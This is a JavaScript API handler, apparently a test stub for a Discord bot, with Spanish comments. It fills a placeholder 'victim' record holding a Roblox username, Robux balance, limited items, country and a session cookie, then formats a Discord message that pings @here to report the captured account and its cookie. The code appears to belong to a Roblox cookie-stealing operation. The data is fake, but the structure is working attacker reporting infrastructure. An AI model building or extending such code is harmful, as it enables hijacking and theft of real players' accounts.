// api/test-urgente.js
export default function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');
    
    const testId = req.query.id || 'test_123456';
    
    // Simular datos de víctima
    global.victims = global.victims || {};
    global.victims[testId] = {
        roblox: {
            username: "Usuario_Test",
            userId: testId,
            robux: 9999,
            seguidores: 5000,
            amigos: 1000,
            premium: "Sí",
            verified: "Sí",
            headless: "Sí",
            korblox: "No"
        },
        cookie: "COOKIE_TEST_123456",
        pais: "Argentina",
        fecha: "10/03/2026",
        hora: "15:30:22 De la Tarde"
    };
    
    // Simular la respuesta que DEBERÍA dar interaction.js
    const mensaje = `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **
👤 Usuario Roblox: Usuario_Test
🆔 ID: ${testId}
💰 Robux: 9999
⭐ Seguidores: 5000
👥 Amigos: 1000
💱 Premium: Sí
🔰 Verificado: Sí

💼 **Inventario:**
Headless: \`Sí\`
Korblox: \`No\`

**🌐 Informacion Horaria:**
🌍 País: \`Argentina\`
📅 Fecha: \`10/03/2026\`
⏰ Hora Exacta: \`15:30:22 De la Tarde\`

🍪 Cookie:
\`\`\`COOKIE_TEST_123456\`\`\``;

    res.status(200).json({
        type: 4,
        data: {
            content: mensaje,
            flags: 64
        }
    });
}